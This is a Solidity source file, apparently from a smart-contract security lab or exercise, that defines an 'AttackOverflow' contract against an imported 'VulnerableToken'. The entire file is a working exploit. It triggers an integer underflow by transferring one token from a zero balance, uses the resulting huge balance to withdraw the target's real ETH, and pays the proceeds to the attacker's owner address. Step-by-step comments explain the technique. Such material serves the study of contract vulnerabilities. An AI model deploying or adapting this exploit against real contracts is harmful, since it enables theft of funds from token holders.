// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableToken.sol";

contract AttackOverflow {
    VulnerableToken public target;
    address public owner;

    constructor(address _target) {
        target = VulnerableToken(_target);
        owner = msg.sender;
    }

    // Step 1: transfer 1 with balance 0 -> underflow -> balance = 2^256 - 1
    // Must transfer to a different address so sender and recipient don't cancel out
    function attack() external {
        target.transfer(address(1), 1);
    }

    // Step 2: withdraw real ETH using the inflated balance
    function drain(uint256 amount) external {
        target.withdraw(amount);
    }

    receive() external payable {}

    function collectProfit() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}